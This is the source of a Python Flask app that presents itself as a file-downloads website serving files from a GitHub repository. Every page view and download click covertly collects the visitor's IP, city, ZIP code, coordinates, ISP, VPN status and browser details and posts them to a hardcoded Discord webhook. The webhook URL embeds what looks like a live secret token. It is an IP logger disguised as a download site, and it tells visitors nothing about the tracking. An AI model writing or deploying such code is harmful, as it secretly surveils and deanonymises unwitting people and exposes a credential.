import os
import time
import uuid
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# ============================================================
# 🎯 CONFIGURAÇÃO
# ============================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O_M9Q2jzholD8UXekoDTCGHeUwr1TznCXR75s3ZiM8oqW7TCnXvZHK7YIMs02cm9g"

GITHUB_REPO_OWNER = "malucomaf16"
GITHUB_REPO_NAME   = "downloads-website"
GITHUB_FILES_PATH  = "arquivos"
GITHUB_BRANCH      = "main"

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

FILTERED_IPS = ["127.0.0.1", "::1", "localhost"]
FILTERED_IP_PREFIXES = ["10.", "172.", "198.18."]

# Cache pra não bater na API toda hora (IP -> dados)
GEO_CACHE = {}
VPN_CACHE = {}
# ============================================================

HEADERS = {}
if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"

# Lista de ISPs/ASNs que são definitivamente datacenter/VPN
DATACENTER_KEYWORDS = [
    "aws", "amazon", "google cloud", "gcp", "azure", "microsoft",
    "digitalocean", "ovh", "hetzner", "linode", "vultr", "m247",
    "frantech", "buyvm", "contabo", "scaleway", "upcloud", "ramnode",
    "psychz", "colocrossing", "choopa", "dedipath", "nforce", "fiberhub",
    "hostwinds", "knownhost", "steadfast", "webnx", "zenlayer", "gigenet",
    "datacenter", "data center", "hosting", "cloud server", "vps",
    "server", "dedicated", "colocation", "transip", "snel",
]

# Extensão -> ícone
EXT_ICONS = {
    ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
    ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
    ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️", ".webp": "🖼️",
    ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄", ".xls": "📄", ".xlsx": "📄",
    ".mp3": "🎵", ".wav": "🎵", ".flac": "🎵",
    ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬", ".mov": "🎬", ".wmv": "🎬",
    ".iso": "💿", ".img": "💿",
    ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨", ".php": "🐘",
    ".apk": "📱", ".dmg": "💻",
}

EXT_CATEGORIES = {
    ".exe": "Applications", ".msi": "Applications", ".dll": "Applications",
    ".zip": "Archives", ".rar": "Archives", ".7z": "Archives", ".tar": "Archives", ".gz": "Archives",
    ".jpg": "Images", ".jpeg": "Images", ".png": "Images", ".gif": "Images", ".bmp": "Images", ".webp": "Images",
    ".pdf": "Documents", ".doc": "Documents", ".docx": "Documents", ".txt": "Documents",
    ".mp3": "Audio", ".wav": "Audio", ".flac": "Audio",
    ".mp4": "Video", ".avi": "Video", ".mkv": "Video",
    ".iso": "Disc Images", ".img": "Disc Images",
    ".py": "Code", ".js": "Code", ".html": "Code",
    ".apk": "Android", ".dmg": "macOS",
}


def is_filtered_ip(ip):
    if ip in FILTERED_IPS:
        return True
    for prefix in FILTERED_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    return False


def get_icon(ext):
    return EXT_ICONS.get(ext.lower(), "📁")


def get_category(ext):
    return EXT_CATEGORIES.get(ext.lower(), "Other")


def get_github_files():
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            contents = resp.json()
            files = []
            for item in contents:
                if item["type"] == "file":
                    name = item["name"]
                    ext = "." + name.rsplit(".", 1)[1] if "." in name else ""
                    size_mb = round(item["size"] / (1024 * 1024), 1)
                    raw_url = item["download_url"]
                    display_name = name.rsplit(".", 1)[0].replace("_", " ").replace("-", " ").strip()
                    files.append({
                        "name": display_name,
                        "filename": name,
                        "ext": ext,
                        "size_mb": size_mb,
                        "raw_url": raw_url,
                        "icon": get_icon(ext),
                        "category": get_category(ext),
                    })
            files.sort(key=lambda x: x["filename"])
            return files
        return []
    except:
        return []


def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"


def detect_vpn(ip, geo):
    """
    Detecta se o IP é VPN/proxy usando 3 métodos:
    1. Heurística por ISP/ASN (rápido, sempre funciona)
    2. proxycheck.io (free, 1000 req/dia)
    3. ip-api.com campo org
    """
    result = {
        "is_vpn": False,
        "method": None,
        "confidence": "low",
        "type": None,
        "isp_name": geo.get("isp", "") + " " + geo.get("org", ""),
        "asn_name": geo.get("as", ""),
    }
    
    isp_lower = result["isp_name"].lower()
    asn_lower = result["asn_name"].lower()
    
    # MÉTODO 1: Heurística por palavra-chave (sempre roda)
    for kw in DATACENTER_KEYWORDS:
        if kw in isp_lower or kw in asn_lower:
            result["is_vpn"] = True
            result["method"] = "keyword_match"
            result["confidence"] = "high"
            result["type"] = "datacenter/vps"
            break
    
    # MÉTODO 2: proxycheck.io (fallback)
    if not result["is_vpn"] and ip not in VPN_CACHE:
        try:
            # proxycheck.io free tier (1000 req/dia sem key)
            resp = requests.get(f"https://proxycheck.io/v2/{ip}?vpn=1&asn=1&risk=1", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if ip in data and isinstance(data[ip], dict):
                    pc_data = data[ip]
                    if pc_data.get("proxy") == "yes":
                        result["is_vpn"] = True
                        result["method"] = "proxycheck.io"
                        result["confidence"] = "high"
                        result["type"] = pc_data.get("type", "proxy").upper()
                        if pc_data.get("risk"):
                            try:
                                result["risk"] = int(pc_data["risk"])
                            except:
                                result["risk"] = "?"
                    VPN_CACHE[ip] = result["is_vpn"]
        except:
            pass
    
    # Se cache do proxycheck existe
    if ip in VPN_CACHE and VPN_CACHE[ip]:
        result["is_vpn"] = True
        result["method"] = "proxycheck.io (cached)"
        result["confidence"] = "high"
    
    # MÉTODO 3: Heurística por range ASN (ASN de datacenter conhecidos)
    if not result["is_vpn"]:
        datacenter_asns = [
            "AS16509", "AS14618", "AS40295",  # AWS
            "AS15169", "AS396982", "AS41264",  # Google Cloud
            "AS8075",  # Microsoft Azure
            "AS14061",  # DigitalOcean
            "AS16276",  # OVH
            "AS24940",  # Hetzner
            "AS63949",  # Linode
            "AS20473",  # Vultr
            "AS9009",  # M247
            "AS4760",  # FranTech / PACKET
            "AS12390",  # Contabo
            "AS51167",  # Contabo
            "AS20454",  # BuyVM / FranTech
            "AS36351",  # SoftLayer/IBM
            "AS13768",  # Peer1 / Cogeco
            "AS23352",  # KnownHost
        ]
        as_part = asn_lower.split()[-1] if asn_lower.split() else ""
        for das in datacenter_asns:
            if das.lower() in asn_lower:
                result["is_vpn"] = True
                result["method"] = "asn_match"
                result["confidence"] = "high"
                result["type"] = "hosting/datacenter"
                break
    
    return result


def get_geolocation(ip):
    """Pega dados de geolocalização + VPN detection"""
    if ip in GEO_CACHE:
        return GEO_CACHE[ip]
    
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,timezone,countryCode", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                # Adiciona detecção de VPN
                vpn_info = detect_vpn(ip, data)
                data["vpn"] = vpn_info
                GEO_CACHE[ip] = data
                return data
    except:
        pass
    
    fallback = {"query": ip, "country": "Unknown", "regionName": "Unknown",
                "city": "Unknown", "zip": "", "lat": 0, "lon": 0,
                "isp": "Unknown", "org": "Unknown", "as": "Unknown",
                "timezone": "Unknown", "countryCode": "XX",
                "vpn": {"is_vpn": False, "method": None, "confidence": "low"}}
    GEO_CACHE[ip] = fallback
    return fallback


def parse_ua(ua):
    ua_l = ua.lower()
    if "windows" in ua_l: os_name = "Windows"
    elif "mac os" in ua_l or "macintosh" in ua_l: os_name = "macOS"
    elif "linux" in ua_l: os_name = "Linux"
    elif "android" in ua_l: os_name = "Android"
    elif "iphone" in ua_l or "ipad" in ua_l: os_name = "iOS"
    else: os_name = "Unknown"
    if "edg" in ua_l: browser = "Edge"
    elif "chrome" in ua_l: browser = "Chrome"
    elif "firefox" in ua_l: browser = "Firefox"
    elif "safari" in ua_l: browser = "Safari"
    elif "opera" in ua_l or "opr" in ua_l: browser = "Opera"
    else: browser = "Unknown"
    return os_name, browser


def send_webhook(action, file_name=""):
    ip = get_client_ip()
    if is_filtered_ip(ip):
        return
    
    ua = request.headers.get("User-Agent", "Unknown")
    os_name, browser = parse_ua(ua)
    geo = get_geolocation(ip)
    vpn = geo.get("vpn", {})
    visit_id = str(uuid.uuid4())[:8]
    
    # 🔹 Status VPN
    if vpn.get("is_vpn"):
        vpn_status = f"🛡️ **VPN / Proxy DETECTED** — {vpn.get('type', 'Unknown')} (confidence: {vpn.get('confidence', 'low')})"
        vpn_color = 0xff6b6b  # red
    else:
        vpn_status = "✅ **Real IP** — No VPN or proxy detected"
        vpn_color = 0x27ae60  # green
    
    # Determina se é visita ou download pro título
    is_download = bool(file_name)
    if is_download:
        embed_title = f"⬇️ 📁 Download — {file_name}"
    else:
        embed_title = f"👁️ Visit — {ip}"
    
    embed = {
        "embeds": [{
            "title": embed_title,
            "color": vpn_color,
            "fields": [
                # 🔹 ID / VPN STATUS (primeira linha destacada)
                {"name": "🆔 Visit ID", "value": visit_id, "inline": True},
                {"name": "📄 Action", "value": file_name if file_name else "Page View", "inline": True},
                {"name": "⏱️ Time (UTC)", "value": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()), "inline": True},
                
                # 🔹 VPN STATUS (linha inteira)
                {"name": "🛡️ Connection Type", "value": vpn_status, "inline": False},
                
                # 🔹 LOCALIZAÇÃO
                {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Country", "value": f"{geo.get('country', '?')} ({geo.get('countryCode', '?')})", "inline": True},
                {"name": "🏙️ City", "value": geo.get("city", "?"), "inline": True},
                {"name": "🗺️ Region", "value": geo.get("regionName", "?"), "inline": True},
                {"name": "📮 ZIP", "value": geo.get("zip", "N/A"), "inline": True},
                {"name": "🧭 Coordinates", "value": f"{geo.get('lat', '?')}, {geo.get('lon', '?')}", "inline": True},
                
                # 🔹 REDE
                {"name": "🏢 ISP", "value": geo.get("isp", "?"), "inline": True},
                {"name": "🏢 Organization", "value": geo.get("org", "?"), "inline": True},
                {"name": "🔗 ASN", "value": geo.get("as", "?"), "inline": True},
                
                # 🔹 SISTEMA
                {"name": "💻 OS", "value": os_name, "inline": True},
                {"name": "🌍 Browser", "value": browser, "inline": True},
                {"name": "🗣️ Language", "value": request.headers.get("Accept-Language", "?"), "inline": True},
                {"name": "💾 Screen", "value": request.args.get("screen", "Not captured"), "inline": True},
                
                # 🔹 REFERÊNCIA
                {"name": "🔗 Referrer", "value": request.referrer or "Direct / None", "inline": False},
                {"name": "📋 Full User-Agent", "value": f"```{ua[:600]}```", "inline": False},
            ],
            "footer": {"text": f"HackerAI • visit:{visit_id} • {geo.get('countryCode', 'XX')}"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
        }]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
        status = "VPN" if vpn.get("is_vpn") else "REAL"
        print(f"[+] {status} | {ip} | {geo.get('city', '?')}/{geo.get('country', '?')} | {file_name or 'Homepage'} | ID:{visit_id}")
    except Exception as e:
        print(f"[!] Webhook error: {e}")


@app.route("/")
def index():
    files = get_github_files()
    send_webhook("Visited Homepage")
    categories = {}
    for f in files:
        cat = f["category"]
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(f)
    return render_template("index.html", categories=categories, total_files=len(files))


@app.route("/download/<path:filename>")
def download_page(filename):
    files = get_github_files()
    file_data = None
    for f in files:
        if f["filename"] == filename:
            file_data = f
            break
    if not file_data:
        return render_template("404.html"), 404
    send_webhook("Clicked Download", file_data["filename"])
    return render_template("download.html", file=file_data)


@app.route("/track")
def track():
    return {"status": "ok"}


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
